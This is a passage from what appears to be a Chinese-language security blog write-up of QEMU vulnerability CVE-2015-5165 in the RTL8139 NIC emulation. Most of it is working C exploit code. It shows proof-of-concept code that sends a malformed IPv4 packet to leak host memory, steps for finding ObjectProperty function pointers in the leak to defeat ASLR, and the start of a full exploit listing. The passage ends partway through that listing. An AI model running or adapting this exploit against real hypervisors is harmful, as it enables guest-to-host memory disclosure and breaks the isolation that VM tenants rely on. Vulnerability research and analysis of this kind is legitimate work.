class="number">0x54</span>, <span class="number">0x00</span>, <span class="number">0x12</span>, <span class="number">0x34</span>, <span class="number">0x57</span>, </span><br><span class="line">    <span class="comment">// SRC MAC 52:54:00:12:34:57</span></span><br><span class="line">    <span class="number">0x52</span>, <span class="number">0x54</span>, <span class="number">0x00</span>, <span class="number">0x12</span>, <span class="number">0x34</span>, <span class="number">0x57</span>, </span><br><span class="line">    <span class="comment">// Length / Type: IPv4</span></span><br><span class="line">    <span class="number">0x08</span>, <span class="number">0x00</span>, </span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Ethernet Frame Payload 数据, 即 IPv4 数据包</span></span><br><span class="line">    <span class="comment">// Version &amp; IHL(Internet Header Length)</span></span><br><span class="line">    (<span class="number">0x04</span> &lt;&lt; <span class="number">4</span>) | <span class="number">0x05</span>,    <span class="comment">// 0x05 * 4 = 20 bytes</span></span><br><span class="line">    <span class="number">0x00</span>,</span><br><span class="line">    <span class="comment">// Total Length = 0x13 = 19 bytes</span></span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x13</span>,     <span class="comment">// 19 - 20 = -1 = 0xFFFF, trigger vulnerability</span></span><br><span class="line">    <span class="number">0xde</span>, <span class="number">0xad</span>,     <span class="comment">// Identification</span></span><br><span class="line">    <span class="number">0x40</span>, <span class="number">0x00</span>,     <span class="comment">// Flags &amp; Fragment Offset</span></span><br><span class="line">    <span class="number">0x40</span>,           <span class="comment">// TTL</span></span><br><span class="line">    <span class="number">0x06</span>,           <span class="comment">// Protocol: TCP</span></span><br><span class="line">    <span class="number">0xde</span>, <span class="number">0xad</span>,     <span class="comment">// Header checksum</span></span><br><span class="line">    <span class="number">0x7f</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="comment">// Source IP: 127.0.0.1</span></span><br><span class="line">    <span class="number">0x7f</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="comment">// Destination IP: 127.0.0.1</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// IP Packet Payload 数据, 即 TCP 数据包</span></span><br><span class="line">    <span class="number">0xde</span>, <span class="number">0xad</span>,     <span class="comment">// Source Port</span></span><br><span class="line">    <span class="number">0xbe</span>, <span class="number">0xef</span>,     <span class="comment">// Destination Port</span></span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="comment">// Sequence Number</span></span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="comment">// Acknowledgement Number</span></span><br><span class="line">    <span class="number">0x50</span>,           <span class="comment">// 01010000, Header Length = 5 * 4 = 20</span></span><br><span class="line">    <span class="number">0x10</span>,           <span class="comment">// 00010000, ACK</span></span><br><span class="line">    <span class="number">0xde</span>, <span class="number">0xad</span>,     <span class="comment">// Window Size</span></span><br><span class="line">    <span class="number">0xde</span>, <span class="number">0xad</span>,     <span class="comment">// TCP checksum</span></span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>      <span class="comment">// Urgent Pointer</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> get_physical_pfn(<span class="keyword">void</span>* addr) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> pfn = <span class="number">-1</span>;</span><br><span class="line">    FILE* fp = fopen(<span class="string">"/proc/self/pagemap"</span>, <span class="string">"rb"</span>);</span><br><span class="line">    <span class="keyword">if</span> (!fp) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> pfn;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!fseek(fp, (<span class="keyword">unsigned</span> <span class="keyword">long</span>)addr / PAGE_SIZE * <span class="number">8</span>, SEEK_SET)) </span><br><span class="line">    &#123;</span><br><span class="line">        fread(&amp;pfn, <span class="keyword">sizeof</span>(pfn), <span class="number">1</span>, fp);</span><br><span class="line">        <span class="keyword">if</span> (pfn &amp; PFN_PRESENT) </span><br><span class="line">        &#123;</span><br><span class="line">            pfn &amp;= PFN_PFN;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(fp);</span><br><span class="line">    <span class="keyword">return</span> pfn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> gva_to_gpa(<span class="keyword">void</span>* addr) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> pfn = get_physical_pfn(addr);</span><br><span class="line">    <span class="keyword">return</span> pfn * PAGE_SIZE + (<span class="keyword">uint64_t</span>)addr % PAGE_SIZE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rtl8139_desc_config_rx</span><span class="params">(rtl8139_ring* ring, rtl8139_desc* desc, <span class="keyword">size_t</span> nb)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> buffer_size = RTL8139_BUFFER_SIZE + <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; nb; ++i) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">memset</span>(&amp;desc[i], <span class="number">0</span>, <span class="keyword">sizeof</span>(desc[i]));</span><br><span class="line">        ring[i].desc = &amp;desc[i];</span><br><span class="line">        </span><br><span class="line">        ring[i].buffer = aligned_alloc(PAGE_SIZE, buffer_size);</span><br><span class="line">        <span class="built_in">memset</span>(ring[i].buffer, <span class="number">0</span>, buffer_size);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// descriptor owned by NIC 准备接收数据</span></span><br><span class="line">        ring[i].desc-&gt;dw0 |= CP_RX_OWN;</span><br><span class="line">        <span class="keyword">if</span> (i == nb - <span class="number">1</span>) </span><br><span class="line">        &#123;</span><br><span class="line">            ring[i].desc-&gt;dw0 |= CP_RX_EOR; <span class="comment">// End of Ring</span></span><br><span class="line">        &#125;</span><br><span class="line">        ring[i].desc-&gt;dw0 &amp;= ~CP_RX_BUFFER_SIZE_MASK;</span><br><span class="line">        ring[i].desc-&gt;dw0 |= buffer_size;   <span class="comment">// buffer_size</span></span><br><span class="line">        ring[i].desc-&gt;buf_lo = (<span class="keyword">uint32_t</span>)gva_to_gpa(ring[i].buffer);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Rx descriptors address</span></span><br><span class="line">    outl((<span class="keyword">uint32_t</span>)gva_to_gpa(desc), RTL8139_PORT + RxRingAddrLO);</span><br><span class="line">    outl(<span class="number">0</span>, RTL8139_PORT + RxRingAddrHI);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rtl8139_desc_config_tx</span><span class="params">(rtl8139_desc* desc, <span class="keyword">void</span>* buffer)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(desc, <span class="number">0</span>, <span class="keyword">sizeof</span>(rtl8139_desc));</span><br><span class="line">    desc-&gt;dw0 |= CP_TX_OWN |    <span class="comment">// descriptor owned by NIC 准备发送数据</span></span><br><span class="line">                 CP_TX_EOR |</span><br><span class="line">                 CP_TX_LS |</span><br><span class="line">                 CP_TX_LGSEN |</span><br><span class="line">                 CP_TX_IPCS |</span><br><span class="line">                 CP_TX_TCPCS;</span><br><span class="line">    desc-&gt;dw0 += RTL8139_BUFFER_SIZE;</span><br><span class="line">    desc-&gt;buf_lo = (<span class="keyword">uint32_t</span>)gva_to_gpa(buffer);</span><br><span class="line">    outl((<span class="keyword">uint32_t</span>)gva_to_gpa(desc), RTL8139_PORT + TxAddr0);</span><br><span class="line">    outl(<span class="number">0</span>, RTL8139_PORT + TxAddr0 + <span class="number">4</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rtl8139_card_config</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 触发漏洞需要设置的一些参数</span></span><br><span class="line">    outl(TxLoopBack, RTL8139_PORT + TxConfig);</span><br><span class="line">    outl(AcceptMyPhys, RTL8139_PORT + RxConfig);</span><br><span class="line">    outw(CPlusRxEnb | CPlusTxEnb, RTL8139_PORT + CpCmd);</span><br><span class="line">    outb(CmdRxEnb | CmdTxEnb, RTL8139_PORT + ChipCmd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rtl8139_packet_send</span><span class="params">(<span class="keyword">void</span>* buffer, <span class="keyword">void</span>* packet, <span class="keyword">size_t</span> len)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (len &lt;= RTL8139_BUFFER_SIZE) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(buffer, packet, len);</span><br><span class="line">        outb(CPlus, RTL8139_PORT + TxPoll);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">xxd</span><span class="params">(<span class="keyword">uint8_t</span>* ptr, <span class="keyword">size_t</span> size)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>, j = <span class="number">0</span>; i &lt; size; ++i, ++j) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">16</span> == <span class="number">0</span>) </span><br><span class="line">        &#123;</span><br><span class="line">            j = <span class="number">0</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"\n0x%08x: "</span>, ptr + i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%02x "</span>, ptr[i]);</span><br><span class="line">        <span class="keyword">if</span> (j == <span class="number">7</span>) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"- "</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 44 * RTL8139_BUFFER_SIZE = 44 * 1514 = 66616</span></span><br><span class="line">    <span class="comment">// 可以收完 65535 字节数据</span></span><br><span class="line">    <span class="keyword">size_t</span> rtl8139_rx_nb = <span class="number">44</span>;</span><br><span class="line">    rtl8139_ring* rtl8139_rx_ring = (rtl8139_ring*)aligned_alloc(</span><br><span class="line">        PAGE_SIZE, rtl8139_rx_nb * <span class="keyword">sizeof</span>(struct rtl8139_ring));</span><br><span class="line">    rtl8139_desc* rtl8139_rx_desc = (rtl8139_desc*)aligned_alloc(</span><br><span class="line">        PAGE_SIZE, rtl8139_rx_nb * <span class="keyword">sizeof</span>(struct rtl8139_desc));</span><br><span class="line">    rtl8139_desc* rtl8139_tx_desc = (rtl8139_desc*)aligned_alloc(</span><br><span class="line">        PAGE_SIZE, <span class="keyword">sizeof</span>(struct rtl8139_desc));</span><br><span class="line">    <span class="keyword">void</span>* rtl8139_tx_buffer = aligned_alloc(PAGE_SIZE, RTL8139_BUFFER_SIZE);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// change I/O privilege level</span></span><br><span class="line">    iopl(<span class="number">3</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// initialize Rx ring, Rx descriptor, Tx descriptor</span></span><br><span class="line">    rtl8139_desc_config_rx(rtl8139_rx_ring, rtl8139_rx_desc, rtl8139_rx_nb);</span><br><span class="line">    rtl8139_desc_config_tx(rtl8139_tx_desc, rtl8139_tx_buffer);</span><br><span class="line">    rtl8139_card_config();</span><br><span class="line">    rtl8139_packet_send(rtl8139_tx_buffer, rtl8139_packet, </span><br><span class="line">                        <span class="keyword">sizeof</span>(rtl8139_packet));</span><br><span class="line">    sleep(<span class="number">2</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// print leaked data</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; rtl8139_rx_nb; ++i) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// RTL8139_BUFFER_SIZE 之后 4 字节数据为 Checksum</span></span><br><span class="line">        <span class="comment">// 不打印也无所谓了</span></span><br><span class="line">        xxd((<span class="keyword">uint8_t</span>*)rtl8139_rx_ring[i].buffer, RTL8139_BUFFER_SIZE);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> free heap blocks</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行 PoC 后，在接收到的中间某些数据包中可以看到泄露的数据：</p><p><img src="/uploads/202006/cve-2015-5165-poc.png" alt="QEMU 漏洞 CVE-2015-5165 PoC"></p><h3 id="4-5-漏洞利用"><a href="#4-5-漏洞利用" class="headerlink" title="4.5 漏洞利用"></a>4.5 漏洞利用</h3><p>Phrack 文章 [1] 漏洞利用的思路为：在泄露的数据中搜索保存了 <code>ObjectProperty</code> 对象的堆块（可能是已经被释放的堆块），通过读取 <code>ObjectProperty</code> 对象中保存的函数指针来泄露模块 <code>qemu-system-x86_64</code> 的基地址。</p><p>结构体 <code>ObjectProperty</code> 的定义如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> Q_TAILQ_ENTRY(type, qual)                               \</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span>                                                        \</span><br><span class="line">    qual type *tqe_next;        <span class="comment">/* next element */</span>              \</span><br><span class="line">    qual type *qual *tqe_prev;  <span class="comment">/* address of previous next element */</span>\</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> QTAILQ_ENTRY(type)       Q_TAILQ_ENTRY(struct type,)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ObjectProperty</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    gchar *name;</span><br><span class="line">    gchar *type;</span><br><span class="line">    gchar *description;</span><br><span class="line">    ObjectPropertyAccessor *get;</span><br><span class="line">    ObjectPropertyAccessor *<span class="built_in">set</span>;</span><br><span class="line">    ObjectPropertyResolve *resolve;</span><br><span class="line">    ObjectPropertyRelease *release;</span><br><span class="line">    <span class="keyword">void</span> *opaque;</span><br><span class="line"></span><br><span class="line">    QTAILQ_ENTRY(ObjectProperty) node;</span><br><span class="line">&#125; ObjectProperty;</span><br></pre></td></tr></table></figure><p>这里 <code>get / set / resolve / release</code> 保存的值均为函数指针。</p><p><strong>利用步骤：</strong></p><ol><li>结构体 <code>ObjectProperty</code> 的大小为 <code>0x50</code> 字节，因此包含 metadata 的堆块的大小为 <code>0x60</code> 字节，可以根据这一信息去搜索泄露的数据中存在的堆块；</li><li>ASLR 不会对地址的低 <code>12</code> 位进行随机化处理，因此可以以相关函数地址的低 <code>12</code> 位为特征进行搜索，以计算出模块 <code>qemu-system-x86_64</code> 的基地址;</li><li>统计泄露的数据中出现的 <code>uint64_t</code> 类型的数据 <code>0x00007FXXYYZZZZZZ</code> ，其中 <code>7FXXYY</code> 出现次数最多的数据，就是 QEMU 虚拟机物理内存的结束地址；</li></ol><p>基于前面的 PoC 代码，笔者重写的一份用于测试 CVE-2015-5165 的完整 Exploit 代码如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 页面相关参数</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SHIFT 12</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE (1 &lt;&lt; PAGE_SHIFT)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PFN_PRESENT (1ull &lt;&lt; 63)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PFN_PFN ((1ull &lt;&lt; 55) - 1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Ethernet Frame 大小</span></span><br><span class="line"><span class="comment">// DST(6) + SRC(6) + Length/Type(2) + PayloadMTU(1500)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RTL8139_BUFFER_SIZE 1514</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// RTL8139 网卡 PMIO 地址</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RTL8139_PORT 0xc000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Rx ownership flag</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_RX_OWN (1&lt;&lt;31)</span></span><br><span class="line"><span class="comment">// w0 end of ring flag</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_RX_EOR (1&lt;&lt;30)</span></span><br><span class="line"><span class="comment">// Rx buffer size mask 表示 0 ~ 12 位为 buffer size</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_RX_BUFFER_SIZE_MASK ((1&lt;&lt;13) - 1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Tx ownership flag</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_OWN (1&lt;&lt;31)</span></span><br><span class="line"><span class="comment">// Tx end of ring flag</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_EOR (1&lt;&lt;30)</span></span><br><span class="line"><span class="comment">// last segment of received packet flag</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_LS (1&lt;&lt;28)</span></span><br><span class="line"><span class="comment">// large send packet flag</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_LGSEN (1&lt;&lt;27)</span></span><br><span class="line"><span class="comment">// IP checksum offload flag</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_IPCS (1&lt;&lt;18)</span></span><br><span class="line"><span class="comment">// TCP checksum offload flag</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_TCPCS (1&lt;&lt;16)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CHUNK_COUNT 0x2000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CHUNK_SIZE_MASK ~7ull</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// RTL8139 网卡寄存器偏移地址</span></span><br><span class="line"><span class="keyword">enum</span> RTL8139_registers </span><br><span class="line">&#123;</span><br><span class="line">    TxAddr0      = <span class="number">0x20</span>,    <span class="comment">// Tx descriptors address</span></span><br><span class="line">    ChipCmd      = <span class="number">0x37</span>,</span><br><span class="line">    TxConfig     = <span class="number">0x40</span>,</span><br><span class="line">    RxConfig     = <span class="number">0x44</span>,</span><br><span class="line">    TxPoll       = <span class="number">0xD9</span>,    <span class="comment">// tell chip to check Tx descriptors for work</span></span><br><span class="line">    CpCmd        = <span class="number">0xE0</span>,    <span class="comment">// C+ Command register (C+ mode only)</span></span><br><span class="line">    <span class="comment">// 虽然名字写的 RxRingAddr, 但实际上是 Rx descriptor 的地址</span></span><br><span class="line">    RxRingAddrLO = <span class="number">0xE4</span>,    <span class="comment">// 64-bit start addr of Rx descriptor</span></span><br><span class="line">    RxRingAddrHI = <span class="number">0xE8</span>,    <span class="comment">// 64-bit start addr of Rx descriptor</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> RTL_8139_tx_config_bits </span><br><span class="line">&#123;</span><br><span class="line">    TxLoopBack = (<span class="number">1</span> &lt;&lt; <span class="number">18</span>) | (<span class="number">1</span> &lt;&lt; <span class="number">17</span>), <span class="comment">// enable loopback test 